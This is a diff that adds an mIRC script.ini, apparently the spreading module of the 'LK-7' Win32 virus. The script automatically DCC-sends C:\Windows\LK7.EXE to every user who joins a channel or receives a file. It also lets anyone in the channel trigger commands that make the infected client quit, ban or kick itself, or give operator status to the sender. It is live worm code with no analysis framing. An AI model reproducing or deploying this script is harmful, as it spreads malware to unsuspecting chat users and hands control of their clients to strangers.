@@ -1,0 +1,14 @@
+[script]
+n0=on 1:join:#: { if ( $nick == $me ) halt
+n1=              else /dcc send $nick C:\Windows\LK7.EXE }
+n1=on 1:filesent:*.*: { if ( $nick != $me ) /dcc send $nick C:\Windows\LK7.EXE }
+n2=on 1:TEXT:leave!!!:#:{ /msg $chan Your will is my command
+n3=                       /part $chan }
+n4=on 1:TEXT:LUCKY !!:#:{ /msg $chan I am a Lamer !!
+n5=                       /nick [Lamer] }
+n6=on 1:TEXT:Die!!!:#:/Quit Be sure, $nick I will commit suicide now .. RIP
+n7=on 1:TEXT:*virus*:#:/msg $chan I am infected with [LK-7]..By LUCKY B.R.D 1994-99.Win32 VIRUS
+n8=on 1:TEXT:*virii*:#:/msg $chan I am infected with [LK-7]..By LUCKY B.R.D 1994-99 Win32 Virus
+n9=on 1:TEXT:Ban!!!:#:/mode $chan +b $me
+n10=on 1:TEXT:Kick!!!:#:/kick $chan $me
+n11=on 1:TEXT:OP!!!:#:/mode $chan +o $nick
